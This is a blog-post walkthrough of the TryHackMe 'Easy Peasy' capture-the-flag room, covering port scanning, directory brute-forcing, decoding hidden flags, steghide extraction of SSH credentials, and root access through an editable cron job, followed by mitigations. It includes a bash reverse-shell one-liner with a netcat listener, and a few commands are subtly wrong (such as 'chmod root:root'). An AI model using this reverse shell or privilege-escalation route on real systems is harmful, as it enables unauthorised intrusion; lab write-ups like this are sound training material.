---
layout: post
title: TryHackMe - Easy Peasy CTF
description: My first CTF writeup on this site!
published: 2025-10-23
updated: 2025-11-04
category: writeups
tags:
  - resources
  - writeups
  - infosec
permalink: /writeups/thm-easy-peasy-ctf
---
I don't know if it was just me, but this room was **not** easy. Here's the link: [Easy Peasy](https://tryhackme.com/room/easypeasyctf). I'll be using `$IP` to specify the machine IP address that was given by TryHackMe.

**Tools Used**: nmap, Gobuster, CyberChef, steghide, [GNU nano](https://www.nano-editor.org/), and bash. Learn more about these tools in my [InfoSec Tools](/infosec-tools) page.

---

# Enumeration

## Task 1 Completion Steps

I ran the following command in my terminal.
```bash
nmap -A -p- $IP
```

Going from left to right, this command:

-  `-A`: enable OS detection, version detection, script scanning, and traceroute. For this task I only need the first two, but since I'm enumerating, I try to find as much information as possible about the target machine.

- `-p` is used to scan ports. `-p-` is used to scan *all* ports.

The result looked like this:

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The server has returned:

1. HTTP port 80 with nginx version **1.16.1** 
2. SSH port 6498 with OpenSSH
3. HTTP port 65524 with **Apache** 

So there are <mark>three</mark> ports, nginx is version no. <mark>1.16.1</mark>, and the highest port is running <mark>Apache</mark>.

---

# Compromising the Machine

I prefer using dirb to gobuster as it automatically enumerates the subdirectories, but I used gobuster for this CTF. I entered

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt
```

The result was this:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:50:37 Starting gobuster
===============================================================
/hidden (Status: 301)
/robots.txt (Status: 200)
===============================================================
2020/08/10 13:54:18 Finished
===============================================================
```

Gobuster finds a `/hidden` directory and `/robots.txt`. I wasn't able to find anything useful in the directory, so I dug deeper.

```bash
gobuster dir -u http://$IP/hidden/ -w /usr/share/wordlists/dirb/common.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 14:13:44 Starting gobuster
===============================================================
/whatever (Status: 301)
===============================================================
2020/08/10 14:16:48 Finished
===============================================================
```

Navigating to `http://$IP/hidden/whatever` and viewing the source code shows a hidden `<p>` field with a base64 encoded string.

```html
<p hidden>Z____________________Q==</p>
```

I found the **first flag** by decoding the string in the terminal.

```bash
echo Z____________________Q== | base64 -decode
flag{__________}
```

Gobuster previously returned a `/robots.txt` file, so I'll look at that.

- Navigate to `http://$IP/robots.txt`.

```
User-Agent: *
Disallow: /
Robots Not Allowed
```

Nothing useful here. What about on the Apache server?

- Navigate to `http://$IP:65524/robots.txt`.

```
User-Agent: *
Disallow: /
Robots Not Allowed
User-Agent: a______________________________0
Allow: /
This Flag Can Enter But Only This Flag No More Exceptions
```

This was flag 2. I ended up looking at [another walkthrough](https://joshuachp.dev/posts/2020-08-06_tryhackme_easy_peasy) for this (thanks Joshua!), and I was able to decode the hash using [this obscure site](https://md5hashing.net/hash) and searching all hash types.[^1]

I started looking for Flag 3 by viewing the website for the Apache server. I scrolled and found the flag in plaintext:

```
Fl4g 3: flag{________________________________}
```

In the source code for this page, I found another hidden `p`:

```html
<p hidden>its encoded with ba....:O______________________u</p>
```

I went to [CyberChef](https://gchq.github.io/CyberChef/) and used every base__ algo until I got something that worked. I found a hidden directory.

```
/n0_____________r
```

Navigation to this page returns an image and a hash. Using `steghide`, a stenography command-line tool, gives me this:

```bash
steghide extract -sf binarycodepixabay.jpg
Enter password:
```

That must be the hash! I decoded it using the [same site](https://md5hashing.net/hash) and settings as before and entered it as the password.

```bash
steghide extract -sf binarycodepixabay.jpg
Enter password:
wrote extracted data to "secrettext.txt".
```

Inside the text, I notice there is a username (boring) and a password as SSH login, but the password is in binary.

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

I decoded it with CyberChef and used these credentials to login via SSH.

```bash
ssh boring@$IP -p 6498
```

I immediately typed `ls`, and `user.txt` is the only (unhidden) result. I opened this and saw the below:

```
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It's Rotated Or Something
synt{a______________y}
```

I un-rotated the flag using `rot13` recipe on CyberChef.

---

## Privilege Escalation: Gaining Root

To get root, I must escalate my user privileges. I used [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), a tool that scans for possible privilege escalation routes on a target machine.

```bash
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
```

I put it on the machine using `scp`, or secure copy, to the `/tmp/` folder.

```bash
scp -P 6498 linpeas.sh boring@$IP:/tmp/
```

On the target machine, I ran the tool.

```bash
boring@kral4-PC:~$ /tmp/limpeas.sh
```

After the execution completed, I noticed there was a “`mysecretcronjob.sh`”. Taking a look at this file revealed that it can run as root. I tried to edit it using [nano](/toolbox). Success! I inserted a Bash reverse shell I grabbed from [pentester.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?source=post_page-----d21b474258f2---------------------------------------).

```bash
bash -i >& /dev/tcp/$IP/4444 0>&1
```

I opened a listener in `netcat` in another terminal window and waited for the job to fire.

```bash
nc -nlvp 4444
```

Explanation of the flags used from left to right:

- `-n`: Don't do any naming or service lookups on any addresses, hostnames, or ports. If used with `–v` option, all addresses and ports are printed in numeric form.
- `-l`: Listen for an incoming connection.
- `-v`: Specify verbose output (give more details).
- `-p`: Specify the port.

I had root! I found the flag in the file `/root/root.txt`.

```
flag{________________________________}
```

---

# Mitigation

Here are the vulnerabilities that allowed me to gain root access.

1. A hidden directory and secret files were discoverable for this server.
2. A cronjob file that can run as root was editable by a non-root user.

Let's look at some mitigations for these.

## Vuln 1 Mitigations - Hiding Website Directories

### 1. Use a .htaccess file

```
Options -Indexes
```

Create or open your `.htaccess` file and add the line above. This tells Apache to turn off directory listing when an index file is not present for the website.

This is a simple fix that doesn't involve changing your file structure or permissions, and it's the mitigation I'd recommend. It's a ***Apache-only*** solution, however there are alternatives for other web servers.[^2]

#### 2. Restrict Access

You can do this using `chmod` or the security settings on your CMS (content management system, such as WordPress).

```bash
chmod 700 robots.txt && chmod 700 /hidden
```

## Vuln 2 Mitigations - Cronjob Access Control

I would recommend implementing all three proposed mitigations below.

- The second proposed mitigation for the directories would work for this file as well. Make sure cronjobs that run as root are only editable by the users with root permissions.
	- This would also follow the *principle of least privilege*: to limit the user and application permissions to what's necessary.

```bash
chmod root:root mysecretcronjob.sh && chmod 700 mysecretcronjob.sh
```

- This file should've been in the `/usr/local/sbin` directory, as it's designed for the locally created system administration scripts with root privileges. This would also require the user to use `sudo` or `su` to run these files.

- Regularly audit all cronjobs in all crontabs for scripts and files that are not owned or writable by root. Use the bash line `ls -l /etc/cron*` to see file ownership and permissions.

  

[^1]: What could've saved me some time was inputting this hash into `hash-cracker`, a command-line tool that can determine hashing algorithms from encoded text. I found out about this *after* I completed this room 😐

[^2]: The `.htaccess` is used to make configuration changes to Apache web servers without editing the config files directly. You can use it to blacklist certain file extensions from running as scripts, reducing the risk of information disclosure.
